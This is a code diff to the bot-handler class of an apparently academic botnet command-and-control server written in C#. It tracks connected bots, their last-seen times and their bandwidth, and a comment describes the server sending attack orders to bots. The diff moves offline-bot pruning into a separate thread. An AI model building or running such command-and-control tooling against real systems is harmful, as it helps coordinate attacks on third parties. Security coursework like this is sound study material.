@@ -33,6 +33,7 @@ namespace Coms4507_Project.BotHandling
         public Dictionary<string, string> botIpPortDetails; // botID -> ip::port
         private Dictionary<string, long> botIdUnixTimestamp; // botID -> UNIX Epoch Timestamp (last request)
         private Dictionary<string, float> botIdBandwidth; // botID -> upload speed (message["bandwidth"])
+       
         private float totalBandwidth;
         public List<string> outputList;
         private int botExceptionsThrown = 0;
@@ -42,8 +43,16 @@ namespace Coms4507_Project.BotHandling
             bots = new List<string>();
             outputList = new List<string>(); // records the output from the bots.
             networkHandler = new NetworkHandler(ip);
-            Thread thread = new Thread(Listener);
+
+            Action<object> listener = (object obj) =>
+             {
+                 Listener();
+             };
+            new Task(listener, "listener").Start();
+
+            Thread thread = new Thread(CheckingForBotUpdater);
             thread.Start();
+
             botIpPortDetails = new Dictionary<string, string>();
             botIdUnixTimestamp = new Dictionary<string, long>();
             botIdBandwidth = new Dictionary<string, float>();
@@ -61,6 +70,31 @@ namespace Coms4507_Project.BotHandling
             return botExceptionsThrown;
         }
 
+        private void CheckingForBotUpdater()
+        {
+            while(true)
+            {
+                try
+                {
+                    // We check that if any bot in the list hasn't responded in 5 seconds, they are considered offline.
+                    foreach (string botName in botIpPortDetails.Keys.ToArray())
+                    {
+                        if (DateTimeOffset.Now.ToUnixTimeSeconds() - botIdUnixTimestamp[botName] > 4)
+                        {
+                            Trace.WriteLine("DELETING: " + botName + "!!!!");
+                            _ = botIpPortDetails.Remove(botName);
+                            _ = botIdUnixTimestamp.Remove(botName);
+                            totalBandwidth -= botIdBandwidth[botName];
+                            _ = botIdBandwidth.Remove(botName);
+                        }
+                    }
+                } catch(Exception ex)
+                {
+                    Trace.WriteLine(ex.Message);
+                }
+                
+            }
+        }
         private void Listener()
         {
             while(true)
@@ -68,26 +102,14 @@ namespace Coms4507_Project.BotHandling
                 
                 try
                 {
-                    // We check that if any bot in the list hasn't responded in 5 seconds, they are considered offline.
-                    foreach (string botName in botIpPortDetails.Keys)
-                    {
-                        if (DateTimeOffset.Now.ToUnixTimeSeconds() - botIdUnixTimestamp[botName] > 4)
-                        {
-                            _ = botIpPortDetails.Remove(botName);
-                            _ = botIdUnixTimestamp.Remove(botName);
-                        }
-                    }
-
                     if (outputList.Count > 25) // For the terminal output.
                     {
                         outputList.RemoveAt(0);
                     }
 
                     // We just loop over this over and over and wait for a message
-                    Trace.WriteLine("waiting");
                     Dictionary<string, string> message = networkHandler.WaitForMessage();
                     JObject jData = JsonConvert.DeserializeObject<JObject>(message["payload"]);
-                    Trace.WriteLine(jData.ToString());
 
                     // All bots provide this information and only respond with ip, id, status, targetIP, port, error, exceptions thrown
                     string ip = jData.GetValue("ip").ToString();
@@ -108,6 +130,7 @@ namespace Coms4507_Project.BotHandling
                     {
                         float tempBandwidthVal = 0;
                         botIdBandwidth[hostID] = float.Parse(jData.GetValue("bandwidth").ToString());
+                        
                         // Updates the total bandwidth of the network.
                         foreach (float upload in botIdBandwidth.Values.ToArray())
                         {
@@ -117,7 +140,7 @@ namespace Coms4507_Project.BotHandling
                     }
   
                     botIdUnixTimestamp[hostID] = DateTimeOffset.Now.ToUnixTimeSeconds(); // Timestamp
-                    Trace.WriteLine(botIpPortDetails.ToString());
+                    Trace.WriteLine("BOT MESSAGE: " + hostID + " at time" + botIdUnixTimestamp[hostID]);
                     /* 
                      * 
                      * WHEN THE C2 WANTS TO DISTRIBUTE AN ATTACK, IT WILL INDEPENDENTLY SEND OUT THOSE MESSAGES WITHOUT CHECKING FOR A RESPONSE,
@@ -126,8 +149,6 @@ namespace Coms4507_Project.BotHandling
                      * THE STATES OF THE BOTS WILL BE NOTICED AFTER ONE SUCCESSFUL LOOP OF THESE BOTS. THE BOTS WILL INDEPENDENTLY UPDATE,
                      * SO THERE ARE NO CALLS REQUIRED BEYOND THE DISTRIBUTION OF AN ATTACK AND THEN CHECKING STATUS LIKE USUAL.
                      */
-
-                    Trace.WriteLine(Check_For_Attack());
 
                     // This is just the basic loop response. It just gets status about a bot.
                     Dictionary<string, object> data = new Dictionary<string, object>
